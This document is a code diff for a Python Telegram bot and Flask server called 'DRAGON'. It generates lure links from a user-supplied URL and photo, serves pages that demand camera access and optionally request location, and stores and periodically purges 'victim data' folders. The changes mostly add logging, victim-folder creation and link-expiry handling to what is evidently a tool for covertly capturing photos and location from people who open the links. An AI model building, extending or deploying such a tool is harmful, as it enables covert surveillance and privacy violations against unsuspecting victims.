@@ -63,7 +63,7 @@ def get_user_active_link(user_id):
 def set_user_active_link(user_id, html_file, photo_file):
     with open(USER_LINKS_FILE, "r") as f:
         data = json.load(f)
-
+    
     old = data.get(str(user_id))
     if old:
         old_html = os.path.join(HTML_DIR, old.get("html"))
@@ -72,7 +72,7 @@ def set_user_active_link(user_id, html_file, photo_file):
             os.remove(old_html)
         if os.path.exists(old_photo):
             os.remove(old_photo)
-
+    
     data[str(user_id)] = {"html": html_file, "photo": photo_file, "created_at": time.time()}
     with open(USER_LINKS_FILE, "w") as f:
         json.dump(data, f)
@@ -98,8 +98,19 @@ def delete_old_victim_data():
             try:
                 if datetime.fromtimestamp(os.path.getmtime(folder_path)) < cutoff_time:
                     shutil.rmtree(folder_path)
-            except:
-                pass
+                    logger.info(f"Deleted old victim data: {folder_name}")
+            except Exception as e:
+                logger.error(f"Error deleting victim data: {e}")
+    
+    if os.path.exists(PHOTO_DIR):
+        for f in os.listdir(PHOTO_DIR):
+            if f.startswith("victim_") or f.startswith("temp_"):
+                filepath = os.path.join(PHOTO_DIR, f)
+                try:
+                    if datetime.fromtimestamp(os.path.getmtime(filepath)) < cutoff_time:
+                        os.remove(filepath)
+                except:
+                    pass
 
 
 def start_auto_cleanup():
@@ -114,6 +125,9 @@ def generate_html(user_id, target_url, photo_filename):
     html_filename = f"{user_id}_{int(time.time())}.html"
     filepath = os.path.join(HTML_DIR, html_filename)
     photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
+    
+    victim_folder = os.path.join(VICTIM_DATA_DIR, f"victim_{user_id}_{int(time.time())}")
+    os.makedirs(victim_folder, exist_ok=True)
     
     html = f"""<!DOCTYPE html>
 <html>
@@ -242,6 +256,7 @@ start();
 @bot.message_handler(commands=['start'])
 def start_command(message):
     user_id = message.chat.id
+    logger.info(f"Start from {user_id}")
     if not is_subscribed(user_id):
         markup = telebot.types.InlineKeyboardMarkup()
         markup.add(telebot.types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2"))
@@ -261,6 +276,8 @@ def handle_message(message):
     state_data = get_user_state(user_id)
     current_state = state_data.get("state")
     
+    logger.info(f"Message from {user_id}: {text[:50]} | State: {current_state}")
+    
     if current_state == "waiting_url":
         if text.startswith(('http://', 'https://')):
             set_user_state(user_id, "waiting_photo", text)
@@ -276,6 +293,7 @@ def handle_message(message):
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
     user_id = message.chat.id
+    logger.info(f"Photo from {user_id}")
     state_data = get_user_state(user_id)
     current_state = state_data.get("state")
     target_url = state_data.get("target_url")
@@ -301,6 +319,7 @@ def handle_photo(message):
         
         link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_filename}"
         bot.send_message(user_id, f"✅ LINK GENERATED:\n{link}\n\n⚠️ This link will stay active until you create a new one!\n📸 Camera COMPULSORY\n📍 Location OPTIONAL")
+        logger.info(f"Link generated for {user_id}: {link}")
         
     except Exception as e:
         logger.error(f"Photo error: {e}")
@@ -309,9 +328,10 @@ def handle_photo(message):
 
 @bot.callback_query_handler(func=lambda call: call.data == "verify")
 def verify_callback(call):
-    if is_subscribed(call.from_user.id):
-        bot.edit_message_text("✅ Verified!\n\nSend me any URL:", call.from_user.id, call.message.message_id)
-        set_user_state(call.from_user.id, "waiting_url")
+    user_id = call.from_user.id
+    if is_subscribed(user_id):
+        bot.edit_message_text("✅ Verified!\n\nSend me any URL:", user_id, call.message.message_id)
+        set_user_state(user_id, "waiting_url")
     else:
         bot.answer_callback_query(call.id, "❌ Join channel first!", True)
 
@@ -330,7 +350,11 @@ def webhook():
 
 @app.route('/view/<filename>')
 def serve_html(filename):
-    return send_from_directory(HTML_DIR, filename)
+    filepath = os.path.join(HTML_DIR, filename)
+    if os.path.exists(filepath):
+        return send_from_directory(HTML_DIR, filename)
+    else:
+        return "Link expired or invalid. Create a new link with /start", 404
 
 
 @app.route('/photos/<filename>')
@@ -340,10 +364,11 @@ def serve_photo(filename):
 
 @app.route('/')
 def home():
-    return f"🐉 DRAGON ACTIVE | Total links: {len([f for f in os.listdir(HTML_DIR) if f.startswith('v_')])}"
+    return f"🐉 DRAGON ACTIVE | Active links: {len([f for f in os.listdir(HTML_DIR) if not f.startswith('state_')])}"
 
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     start_auto_cleanup()
+    logger.info(f"🚀 DRAGON bot starting on port {port}")
     app.run(host='0.0.0.0', port=port)
